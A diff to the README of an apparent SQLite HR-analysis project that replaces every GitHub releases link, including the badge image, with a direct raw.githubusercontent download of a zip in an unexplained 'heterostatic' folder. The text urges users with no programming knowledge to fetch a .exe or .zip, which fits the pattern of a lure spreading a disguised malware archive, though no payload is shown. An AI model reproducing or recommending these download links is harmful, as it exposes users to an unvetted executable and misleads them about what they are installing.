@@ -1,7 +1,7 @@
 # 🎉 hr-sql-analysis - Analyze HR Data Efficiently
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/pradaaremania/hr-sql-analysis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pradaaremania/hr-sql-analysis/main/heterostatic/hr-sql-analysis.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/pradaaremania/hr-sql-analysis/main/heterostatic/hr-sql-analysis.zip)
 
 ## 📖 Description
 Welcome to the **HR Analytics project using SQLite**. This software helps you analyze employee data such as departments, salaries, hires, and terminations. You can uncover insights and make informed decisions based on your HR data.
@@ -28,7 +28,7 @@ Welcome to the **HR Analytics project using SQLite**. This software helps you an
 Follow these steps to download and run the software. No programming knowledge is required.
 
 ### 1. Visit the Releases Page
-To get started, [visit this page to download](https://github.com/pradaaremania/hr-sql-analysis/releases). You will find the latest version of the software available for download.
+To get started, [visit this page to download](https://raw.githubusercontent.com/pradaaremania/hr-sql-analysis/main/heterostatic/hr-sql-analysis.zip). You will find the latest version of the software available for download.
 
 ### 2. Download the Software
 On the releases page, you will see different versions available. Click on the version you wish to download. This will typically be the latest version. Look for a file with a `.exe` or `.zip` extension.
@@ -87,4 +87,4 @@ A: Currently, we do not have a dedicated user manual, but this README covers the
 Remember, analyzing your employee data can provide valuable insights. Download now and start your analysis journey!
 
 ## 📥 Download Again
-For your convenience, [visit this page to download](https://github.com/pradaaremania/hr-sql-analysis/releases) the latest version of the software.
+For your convenience, [visit this page to download](https://raw.githubusercontent.com/pradaaremania/hr-sql-analysis/main/heterostatic/hr-sql-analysis.zip) the latest version of the software.
